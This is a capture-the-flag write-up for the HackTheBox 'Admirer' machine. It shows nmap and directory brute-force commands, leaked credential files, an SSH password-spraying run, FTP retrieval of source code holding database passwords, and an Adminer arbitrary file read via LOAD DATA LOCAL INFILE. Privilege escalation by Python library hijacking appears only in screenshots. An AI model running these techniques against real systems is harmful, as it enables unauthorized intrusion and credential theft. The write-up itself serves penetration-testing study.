---
title: "HackTheBox — Admirer Writeup"
date: 2020-09-30 13:00:00 +0530
categories: [HackTheBox,Linux Machines]
tags: [admirer,adminer,ffuf,MariaDB,mysql,setenv,pythonpath,souce-code,mysql,credentials,sudo,path-hijack,python-library-hijack,ctf]
image: /assets/img/Posts/Admirer.png
---

> Admirer is an easy box with bunch of rabbit holes where usual enumeration workflow doesn't work forcing us think out of the box and gather initial data. We'll start with web-recon where will find FTP credentials, inside FTP share we'll discover an outdated source code of the website leading us enumerate further and discover an vulnerable version of Adminer Web Interface running on Box allowing us to read local files on the server, where we'll read current source of the page, get credentials which works for SSH access. For elevating privilege to root we'll abuse sudo privilege allowing us to set up an environment variable and execute a script, leading to Python Library hijack and get RCE as root.

## Reconnaissance

# Enumaration

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Admirer
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 29 11:41:49 2021 -- 1 IP address (1 host up) scanned in 10.47 seconds
```


## Checking /admin-dir

![lol](/assets/img/Posts/8d1e7f4a42f066c73ac8f90e62058d58.png)

## Checking robots.txt

![lol2](/assets/img/Posts/4d5ea5041e21e836f92582ef39abed82.png)



### Looks like its only disallowing the parent folder /admin-dir, but forgot to add the * to include all the children directories

<br>

## Enumerating directories under /admin-dir


### rustbuster dir --url http://10.10.10.187/admin-dir/ --wordlist /usr/share/seclists/Discovery/WebContent/common.txt  -e php,txt -t 30


![lol3](/assets/img/Posts/39fe8a63af29edb59fd1cf163658ff3e.png)

### gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,html -t 70

![lol4](/assets/img/Posts/150ea2ac7c69e112ed38e54bde15c977.png)

### dirbuster -u 10.10.10.187/utility-scripts/ -o dirsearch_utility_scripts -t 15


![lol5](/assets/img/Posts/ee0ea0ee15153b6b85aedec49d6f36b9.png)

### wfuzz -c -t 200 --hc=404,403 -w /usr/share/seclists/Discovery/Web-Content/big.txt http://10.10.10.187/utility-scripts/FUZZ.php

![lol6](/assets/img/Posts/c2c108ea5baaa0c5a03f94ac9db48b01.png)

### Credentials.txt

```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

### Contacts.txt

```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb

##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb

#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```


## Brutefored SSH , but nothing happened

### crackmapexec ssh 10.10.10.187 -u usernames -p passwords

```
SSH         10.10.10.187    22     10.10.10.187     [*] SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
SSH         10.10.10.187    22     10.10.10.187     [-] p.wise:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] p.wise:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] p.wise:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] r.nayyar:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] r.nayyar:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] r.nayyar:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] a.bialik:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] a.bialik:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] a.bialik:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] l.galecki:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] l.galecki:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] l.galecki:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] h.helberg:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] h.helberg:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] h.helberg:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] b.rauch:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] b.rauch:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] b.rauch:w0rdpr3ss01! Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] root:fgJr6q#S\W:$P Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] root:%n?4Wz}R$tTF7 Authentication failed.
SSH         10.10.10.187    22     10.10.10.187     [-] root:w0rdpr3ss01! Authentication failed.
```


## Checking FTP

```
ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:b3t4m3): ftpuser
331 Please specify the password.
Password: %n?4Wz}R$tTF7
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||56045|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
ftp> mget *
```

### using wget to recursive download everything in the server

![lel](/assets/img/Posts/7b45a5c34270926648106ce6653b0d4b.png)

### Checking the gzip file

![lol222](/assets/img/Posts/fe9d499f764ce6614a040b92d7a3e3fe.png)

### Checking new directory utility-scripts, inside db_admin.php:

![lol444](/assets/img/Posts/581060223b192b9751d907eb5f897c8c.png)

```
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>
```

### Index.php

![lol7](/assets/img/Posts/9fbcaa2fea218f5a17c74493a73a13e2.png)

```
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";
```


## tried but password didn't work anywhere


# Creating DB and connecting to Adminer

```
LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE backup.backup FIELDS TERMINATED BY "\n"
```


```
MariaDB [backup]> SELECT * FROM `backup` LIMIT 50 | tee backup                                                                            
      <?php                                                                                |                                                                  
|                         $servername = "localhost";                                         |                                                                                                   
|                         $username = "waldo";                                               |                                                                                                   
|                         $password = "&<h5b~yK3F#{PaPB&dA}{H>";                             |                                                                                                   
|                         $dbname = "admirerdb";                                             |                                                                                                   
|                                                                                            |                                                                                                   
|                         // Create connection                                               |                                                                                                   
|                         $conn = new mysqli($servername, $username, $password, $dbname);    |                                                                                                   
|                         // Check connection                                                |                                                                                                   
|                         if ($conn->connect_error) {                                        |                                                                                                   
|                             die("Connection failed: " . $conn->connect_error);             |                                                                                                   
|                         }                                                                  |                                                                                                   
|                                                                                            |                                                                          |                                                                                                   
+--------------------------------------------------------------------------------------------+                                                                                                   
50 rows in set (0.000 sec)                      

```


## http://10.10.10.187/utility-scripts/adminer.php

![lol3333](/assets/img/Posts/ef02abc5f6268a22e5383681c1a3c816.png)

```
MariaDB [(none)]> CREATE DATABASE pwn;
Query OK, 1 row affected (0.003 sec)
MariaDB [(none)]> use pwn
Database changed
MariaDB [pwn]> CREATE TABLE exfil (data VARCHAR(256));
Query OK, 0 rows affected (0.008 sec)
```
![lal343](/assets/img/Posts/3f5934ce7900800d065282bb78141374.png)


![sdfgdfg](/assets/img/Posts/715a417e91e81884886a868e092f9d33.png)

![dfgsfds](/assets/img/Posts/58fd325f674f8195c16357d170a09064.png)

```
load data local infile "/var/www/html/index.php"
into table pwned.data
```
![sdfgsdfs](/assets/img/Posts/13985ae654d999563cd742e29e2fad9f.png)

## Waldo

### procmon.sh

#### Library hijacking

![d01be1483400ededd9aacded1ad903d9.png](/assets/img/Posts/d01be1483400ededd9aacded1ad903d9.png)

![c424ca41b4571c0de861f778567de04b.png](/assets/img/Posts/c424ca41b4571c0de861f778567de04b.png)


### Abusing SETENV with sudo privileges

![eac4f7999913b8cda629b9369de8ceb0.png](/assets/img/Posts/eac4f7999913b8cda629b9369de8ceb0.png)
